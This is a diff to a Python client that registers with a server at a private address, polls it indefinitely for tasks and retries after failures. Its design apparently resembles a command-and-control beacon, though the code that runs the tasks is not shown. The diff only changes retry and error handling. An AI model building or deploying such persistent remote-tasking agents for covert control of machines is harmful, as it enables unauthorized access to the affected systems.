@@ -1,7 +1,6 @@
 import requests
 import socket
 import time
-import threading
 import subprocess
 import platform
 
@@ -18,7 +17,8 @@ class Client:
     def register(self):
         data = {'agent_id': self.local_ip}
         req = requests.post(f"http://{self.server_ip}:{self.port}/register", json=data, timeout=10)
-        assert req.status_code == 201 or req.status_code == 200
+        if req.status_code not in [200, 201]:
+            raise ValueError("Failed to register")
 
     def handle_task(self,task_json):
         try:
@@ -46,11 +46,13 @@ class Client:
             pass
 
     def run(self):
-        try:
-            self.register()
-        except:
-            time.sleep(120)
-            self.run()
+        while True:
+            try:
+                self.register()
+                break #Registration successful, move on to task retrieval
+            except:
+                #Registration failed, retrying
+                time.sleep(60)
         while True:
             try:
                 req = requests.post(f"http://{self.server_ip}:{self.port}/tasks", json={'agent_id': self.local_ip}, timeout=10)
@@ -58,12 +60,10 @@ class Client:
                     self.register()
                     continue
                 if req.status_code not in [200, 201, 204]:
-                    raise ValueError("Failed to get tasks")
-                elif req.status_code == 204:
-                    #print("No tasks")
                     time.sleep(120)
                     continue
-                if req.text == "NULL":
+                elif req.status_code == 204:
+                    #print("No tasks")
                     time.sleep(120)
                     continue
                 tasks = req.json()
@@ -72,7 +72,6 @@ class Client:
                 time.sleep(120)
                 continue
                 #print(e)
-            time.sleep(120)
 
 def main():
     client = Client("10.50.0.12", 80)
